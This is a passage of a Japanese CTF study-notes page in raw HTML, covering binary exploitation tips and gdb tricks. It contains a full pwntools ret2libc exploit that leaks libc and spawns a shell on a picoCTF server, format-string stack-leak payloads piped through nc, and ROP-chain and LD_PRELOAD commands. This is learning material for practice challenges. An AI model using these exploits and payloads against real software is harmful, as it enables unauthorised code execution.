0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>pwnのTips</h2>\n<h3 id=\"プロセスにバイトコードを送り込む\" style=\"position:relative;\"><a href=\"#%E3%83%97%E3%83%AD%E3%82%BB%E3%82%B9%E3%81%AB%E3%83%90%E3%82%A4%E3%83%88%E3%82%B3%E3%83%BC%E3%83%89%E3%82%92%E9%80%81%E3%82%8A%E8%BE%BC%E3%82%80\" aria-label=\"プロセスにバイトコードを送り込む permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>プロセスにバイトコードを送り込む</h3>\n<ul>\n<li>スクリプト(Pwntool)</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">import</span> binascii\n<span class=\"token keyword\">import</span> time\n\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./vuln\"</span><span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> elf\n\nputs_plt <span class=\"token operator\">=</span> <span class=\"token number\">0x400540</span>\ngot_plt_scanf <span class=\"token operator\">=</span> <span class=\"token number\">0x601038</span>\nrop_rdi_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x400913</span>\nret <span class=\"token operator\">=</span> <span class=\"token number\">0x40052e</span>\nmain <span class=\"token operator\">=</span> <span class=\"token number\">0x400771</span>\n\n<span class=\"token comment\"># Local</span>\np <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">\"./vuln\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># Remote</span>\np <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"mercury.picoctf.net\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">42072</span><span class=\"token punctuation\">)</span>\n\npayload <span class=\"token operator\">=</span> <span class=\"token string\">b\"\"</span>\npayload <span class=\"token operator\">+=</span> <span class=\"token string\">b\"\\x41\"</span><span class=\"token operator\">*</span><span class=\"token number\">128</span>\npayload <span class=\"token operator\">+=</span> <span class=\"token string\">b\"\\x42\"</span><span class=\"token operator\">*</span><span class=\"token number\">8</span>\npayload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>rop_rdi_ret<span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>got_plt_scanf<span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>main<span class=\"token punctuation\">)</span>\n\nr <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nr <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\nleakaddr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>rstrip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b\"\\x00\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># print(hex(leakaddr))</span>\n\nbase_addr <span class=\"token operator\">=</span> leakaddr <span class=\"token operator\">-</span> <span class=\"token number\">0x07bf30</span>\nsystem_addr <span class=\"token operator\">=</span> base_addr <span class=\"token operator\">+</span> <span class=\"token number\">0x04f4e0</span>\nstr_bin_sh <span class=\"token operator\">=</span> base_addr <span class=\"token operator\">+</span>  <span class=\"token number\">0x1b40fa</span>\n\npayload <span class=\"token operator\">=</span> <span class=\"token string\">b\"\"</span>\npayload <span class=\"token operator\">+=</span> <span class=\"token string\">b\"\\x41\"</span><span class=\"token operator\">*</span><span class=\"token number\">128</span>\npayload <span class=\"token operator\">+=</span> <span class=\"token string\">b\"\\x42\"</span><span class=\"token operator\">*</span><span class=\"token number\">8</span>\npayload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>rop_rdi_ret<span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>str_bin_sh<span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>system_addr<span class=\"token punctuation\">)</span>\n\nr <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<ul>\n<li>標準入出力を使う</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">python -c <span class=\"token string\">'import sys; sys.stdout.buffer.write(b\"A\" * 16 +  b\"\\xce\\xfa\\xde\\xc0\")'</span>\n\n<span class=\"token builtin class-name\">echo</span> -e <span class=\"token string\">'AAAAAAAAAAAAAAAA\\xce\\xfa\\xde\\xc0'</span></code></pre></div>\n<ul>\n<li>よく使う文字列</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token comment\"># ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789</span>\n<span class=\"token function\">import</span> string\nstring.ascii_uppercase + string.ascii_lowercase + <span class=\"token string\">\"0123456789\"</span></code></pre></div>\n<h3 id=\"return-to-pltreturn-to-libc\" style=\"position:relative;\"><a href=\"#return-to-pltreturn-to-libc\" aria-label=\"return to pltreturn to libc permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Return to PLT/Return to libc</h3>\n<ul>\n<li><code class=\"language-text\">call</code>は、呼び出し時にリターンアドレスをスタックにpushしており、関数が終了する際に呼び出される<code class=\"language-text\">ret</code>は、スタックに積まれたリターンアドレスをpopしてEIPレジスタに書き込むことで呼び出し元に戻ることができる。</li>\n<li><code class=\"language-text\">call</code>は呼び出し時にリターンアドレスとrbpを順にスタックに積む。つまり、ローカルスタックの最上位スタックにはリターンアドレスが格納されている。</li>\n<li>つまり、64bitELFの場合は基本的にはRBPレジスタ+0x8のアドレスにリターンアドレスが格納されているため、スタックを操作できる場合はこのアドレスの値を任意に書き換えることで戻り先を指定することが可能になる。</li>\n<li>そのため、BOFを悪用する場合、入力値の先頭バイトが格納されるアドレスとRBPの値を取得することで、<code class=\"language-text\">$RBP+0x8-&lt;入力値格納先></code>の計算で比較的スマートにRIPの改ざんまでに必要なバイトサイズを特定することができる。</li>\n<li>systemを呼び出す際にASLRでアドレスが変わる場合は、victim側のprintやputなどのアドレスをリークし、相対位置で実行時のsystemのアドレスを参照する必要がある。</li>\n<li>Return to PLT：バイナリで使用される関数のプロセスリンケージテーブルエントリにジャンプし、それを使用してGOTポインタをリークし、libcバージョンを予測する</li>\n<li>\n<p>Return to libc：system()などのアドレスに直接ジャンプする</p>\n<ul>\n<li>典型的なret2libcの場合は、まずlibcのアドレスをリークさせる</li>\n<li>リークさせたアドレスと<a href=\"https://libc.blukat.me/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">libc database search</a>を使って、libcのベースアドレスを特定する</li>\n<li>ベースアドレスとの相対位置から<code class=\"language-text\">/bin/sh</code>のアドレスを特定し、以下のようなスタック構成でシェルを取得できる</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th align=\"center\">スタック</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td align=\"center\">ret</td>\n</tr>\n<tr>\n<td align=\"center\">pop rdi; ret</td>\n</tr>\n<tr>\n<td align=\"center\"><code class=\"language-text\">/bin/sh</code></td>\n</tr>\n<tr>\n<td align=\"center\">system()</td>\n</tr>\n</tbody>\n</table>\n</li>\n<li>systemのアドレスを使用してもシェルが取れない場合は、アラインメントでセグメント違反が出ていないかを確認してみる</li>\n<li>PLTを探索する</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">$ objdump -d -M intel -j .plt ./myapp\n\n<span class=\"token comment\"># peda</span>\n$ plt</code></pre></div>\n<h3 id=\"書式文字攻撃サンプル\" style=\"position:relative;\"><a href=\"#%E6%9B%B8%E5%BC%8F%E6%96%87%E5%AD%97%E6%94%BB%E6%92%83%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB\" aria-label=\"書式文字攻撃サンプル permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>書式文字攻撃サンプル</h3>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">// スタックの中身を表示\nAAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x\n\n// <span class=\"token number\">10</span>番目の値を表示\nAAAA%10<span class=\"token variable\">$08x</span>\n\n// netcatで書式文字攻撃\npython3 -c <span class=\"token string\">'print(\"1\\n\" + \"%p.\" * 50)'</span> <span class=\"token operator\">|</span> <span class=\"token function\">nc</span> mercury.picoctf.net <span class=\"token number\">20195</span> <span class=\"token operator\">|</span> <span class=\"token function\">tr</span> <span class=\"token string\">\".\"</span> <span class=\"token string\">\"<span class=\"token entity\" title=\"\\n\">\\n</span>\"</span> <span class=\"token operator\">|</span> <span class=\"token keyword\">while</span> <span class=\"token builtin class-name\">read</span> line<span class=\"token punctuation\">;</span> <span class=\"token keyword\">do</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token variable\">$line</span> <span class=\"token operator\">|</span> xxd -r -p <span class=\"token operator\">|</span> strings -n1 <span class=\"token operator\">|</span> <span class=\"token function\">rev</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">done</span> <span class=\"token operator\">|</span> <span class=\"token function\">tr</span> -d <span class=\"token string\">\"<span class=\"token entity\" title=\"\\n\">\\n</span>\"</span></code></pre></div>\n<h3 id=\"ropサンプル\" style=\"position:relative;\"><a href=\"#rop%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB\" aria-label=\"ropサンプル permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ROPサンプル</h3>\n<ul>\n<li>ガジェットの探索</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">$ ropper --file app\n$ ROPgadget --binary app</code></pre></div>\n<ul>\n<li>pwntoolsのROPをロードする</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./app\"</span><span class=\"token punctuation\">)</span>\nrop <span class=\"token operator\">=</span> ROP<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">)</span></code></pre></div>\n<ul>\n<li>ROPに使える機械語の対応</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th align=\"center\">x86_64</th>\n<th align=\"center\">pop rdi;</th>\n<th align=\"center\">0x5f</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n</tr>\n</tbody>\n</table>\n<ul>\n<li>ROP Chainの構築</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">$ ROPgadget --binary myapp --ropchain</code></pre></div>\n<p>参考：<a href=\"https://hackmd.io/@Xornet/BJh5RikpU\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">HSCTF 6 - Combo Chain - HackMD</a></p>\n<h3 id=\"got-overwriteサンプル\" style=\"position:relative;\"><a href=\"#got-overwrite%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB\" aria-label=\"got overwriteサンプル permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>GOT Overwriteサンプル</h3>\n<p>※ 工事中</p>\n<h3 id=\"glibリンカのバージョン問題\" style=\"position:relative;\"><a href=\"#glib%E3%83%AA%E3%83%B3%E3%82%AB%E3%81%AE%E3%83%90%E3%83%BC%E3%82%B8%E3%83%A7%E3%83%B3%E5%95%8F%E9%A1%8C\" aria-label=\"glibリンカのバージョン問題 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>glib、リンカのバージョン問題</h3>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token comment\"># ライブラリファイルが与えられている場合</span>\n<span class=\"token assign-left variable\">LD_LIBRARY_PATH</span><span class=\"token operator\">=</span><span class=\"token variable\"><span class=\"token variable\">`</span><span class=\"token builtin class-name\">pwd</span><span class=\"token variable\">`</span></span> ./chall\n<span class=\"token assign-left variable\">LD_PRELOAD</span><span class=\"token operator\">=</span>./libc.so.6 ./chall\n\n<span class=\"token comment\"># patchelfとpwninitをダウンロードしておく</span>\npwninit</code></pre></div>\n<h3 id=\"ローカルでバイナリをxintedする\" style=\"position:relative;\"><a href=\"#%E3%83%AD%E3%83%BC%E3%82%AB%E3%83%AB%E3%81%A7%E3%83%90%E3%82%A4%E3%83%8A%E3%83%AA%E3%82%92xinted%E3%81%99%E3%82%8B\" aria-label=\"ローカルでバイナリをxintedする permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ローカルでバイナリをxintedする</h3>\n<ul>\n<li>/etc/serviceを設定する</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token comment\"># Local services</span>\napp             <span class=\"token number\">10080</span>/tcp</code></pre></div>\n<ul>\n<li>/etc/xinetd.d/myapp を作成して、アプリケーションのパスを指定する</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">$ <span class=\"token function\">cat</span> /etc/xinetd.d/myapp \n<span class=\"token function\">service</span> app\n<span class=\"token punctuation\">{</span>\n        disable         <span class=\"token operator\">=</span> no\n        socket_type     <span class=\"token operator\">=</span> stream\n        <span class=\"token function\">wait</span>            <span class=\"token operator\">=</span> no\n        user            <span class=\"token operator\">=</span> kali\n        server          <span class=\"token operator\">=</span> /home/kali/Downloads/app\n        log_on_failure  <span class=\"token operator\">+=</span> USERID\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>サービスを起動して接続確認</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token function\">sudo</span> <span class=\"token function\">service</span> xinetd start\n<span class=\"token function\">nc</span> localhost <span class=\"token number\">10080</span></code></pre></div>\n<h3 id=\"heap-exploit\" style=\"position:relative;\"><a href=\"#heap-exploit\" aria-label=\"heap exploit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Heap Exploit</h3>\n<ul>\n<li><a href=\"/ctf-learning-heap\">よちよちCTFerがHeap完全に理解したになるまでのメモ</a></li>\n</ul>\n<h3 id=\"pwn参考記事\" style=\"position:relative;\"><a href=\"#pwn%E5%8F%82%E8%80%83%E8%A8%98%E4%BA%8B\" aria-label=\"pwn参考記事 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Pwn参考記事</h3>\n<ul>\n<li><a href=\"https://hackmd.io/@xk4KNXQvTxu07bQ0WJ7FUQ/rJTiw9Ww4?type=view\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Pwn 入門編 - HackMD</a></li>\n</ul>\n<h2 id=\"gdbのtips\" style=\"position:relative;\"><a href=\"#gdb%E3%81%AEtips\" aria-label=\"gdbのtips permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>gdbのTips</h2>\n<h3 id=\"フラグ置き換え方法\" style=\"position:relative;\"><a href=\"#%E3%83%95%E3%83%A9%E3%82%B0%E7%BD%AE%E3%81%8D%E6%8F%9B%E3%81%88%E6%96%B9%E6%B3%95\" aria-label=\"フラグ置き換え方法 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>フラグ置き換え方法</h3>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token comment\"># Toggle Flag</span>\ninfo registers eflags\n<span class=\"token builtin class-name\">set</span> <span class=\"token variable\">$CF</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token builtin class-name\">set</span> <span class=\"token variable\">$PF</span> <span class=\"token operator\">=</span> <span class=\"token number\">2</span>\n<span class=\"token builtin class-name\">set</span> <span class=\"token variable\">$ZF</span> <span class=\"token operator\">=</span> <span class=\"token number\">6</span>\n<span class=\"token builtin class-name\">set</span> <span class=\"token variable\">$SF</span> <span class=\"token operator\">=</span> <span class=\"token number\">7</span>\n\n<span class=\"token builtin class-name\">set</span> <span class=\"token variable\">$eflags</span> ^<span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token variable\">$SF</span><span class=\"token punctuation\">)</span>\n<span class=\"token builtin class-name\">set</span> <span class=\"token variable\">$eflags</span> ^<span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token variable\">$ZF</span><span class=\"token punctuation\">)</span>\n<span class=\"token builtin class-name\">set</span> <span class=\"token variable\">$eflags</span> ^<span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token variable\">$CF</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># Set flag</span>\neflags <span class=\"token punctuation\">[</span> IF <span class=\"token punctuation\">]</span>\n<span class=\"token builtin class-name\">set</span> <span class=\"token variable\">$eflags</span> <span class=\"token operator\">=</span> 0x42\n\neflags <span class=\"token punctuation\">[</span> IF <span class=\"token punctuation\">]</span> \n<span class=\"token builtin class-name\">set</span> <span class=\"token variable\">$eflags</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n\neflags <span class=\"token punctuation\">[</span> CF PF AF ZF SF TF IF DF OF NT RF AC <span class=\"token punctuation\">]</span> \n<span class=\"token builtin class-name\">set</span> <span class=\"token variable\">$eflags</span> <span class=\"token operator\">=</span> 0xFFFFF\n\n<span class=\"token comment\">## Clear Flag</span>\n<span class=\"token builtin class-name\">set</span> <span class=\"token variable\">$eflags</span> <span class=\"token operator\">&amp;</span><span class=\"token operator\">=</span> ~<span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token variable\">$ZF</span><span class=\"token punctuation\">)</span></code></pre></div>\n<h3 id=\"条件ジャンプ命令メモ\" style=\"position:relative;\"><a href=\"#%E6%9D%A1%E4%BB%B6%E3%82%B8%E3%83%A3%E3%83%B3%E3%83%97%E5%91%BD%E4%BB%A4%E3%83%A1%E3%83%A2\" aria-label=\"条件ジャンプ命令メモ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>条件ジャンプ命令メモ</h3>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">命令\tジャンプ条件\nJA\tより上（CF <span class=\"token operator\">=</span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;</span> ZF <span class=\"token operator\">=</span> <span class=\"token number\">0</span>）  <span class=\"token number\">77</span>\nJAE\tより上か等しい（CF <span class=\"token operator\">=</span> <span class=\"token number\">0</span>）\nJB\tより下（CF <span class=\"token operator\">=</span> <span class=\"token number\">1</span>）  <span class=\"token number\">72</span>\nJBE\tより下か等しい（CF <span class=\"token operator\">=</span> <span class=\"token number\">1</span> <span class=\"token operator\">|</span> ZF <span class=\"token operator\">=</span> <span class=\"token number\">1</span>）\nJC\tキャリーがある（CF <span class=\"token operator\">=</span> <span class=\"token 